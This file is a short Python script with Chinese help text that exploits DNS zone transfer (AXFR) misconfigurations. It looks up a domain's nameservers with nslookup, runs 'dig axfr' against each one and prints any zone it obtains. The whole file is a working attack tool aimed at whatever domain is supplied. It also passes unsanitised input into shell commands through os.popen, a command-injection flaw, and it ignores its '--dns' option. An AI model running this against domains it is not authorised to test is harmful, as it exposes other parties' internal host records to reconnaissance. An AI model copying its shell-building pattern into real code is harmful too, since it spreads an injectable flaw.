# -*- coding:UTF-8 -*-

import os
import re
import optparse

class Transferrer(object):

    def exp(cls, domain, dns):

        print('[+] Nslookup %s' % domain)
        cmd_res = os.popen('nslookup -type=ns ' + domain).read()  # fetch DNS Server List
        dns_servers = re.findall('nameserver = ([\w\.]+)', cmd_res)
        if len(dns_servers) == 0:
            print('[+] No DNS Server Found!\n')
            exit(0)
        for singledns in dns_servers:
            print('[+] Using @%s' % singledns)
            cmd_res = os.popen('dig @%s axfr %s' % (singledns, domain)).read()
            # print cmd_res
            if cmd_res.find('XFR size') > 0:
                print('[+] Vulnerable dns server found:', singledns)
                print(cmd_res)
            else:
                print('[+] No Vulnerable found')


parse = optparse.OptionParser(usage='usage:%prog [options] --dns DNS IP地址 --domain 域名', version='%prog 1.0')
parse.prog = 'dns域传送漏洞'
parse.add_option('--domain', dest='domain', action='store', type=str, metavar='domain', help='域名')
parse.add_option('--dns', dest='dns', action='store', type=str, metavar='dns', help='DNS服务器地址')
options, args = parse.parse_args()

if not options.domain:
    parse.error('必须输入要查询的域名')

t = Transferrer()
t.exp(options.domain, options.dns)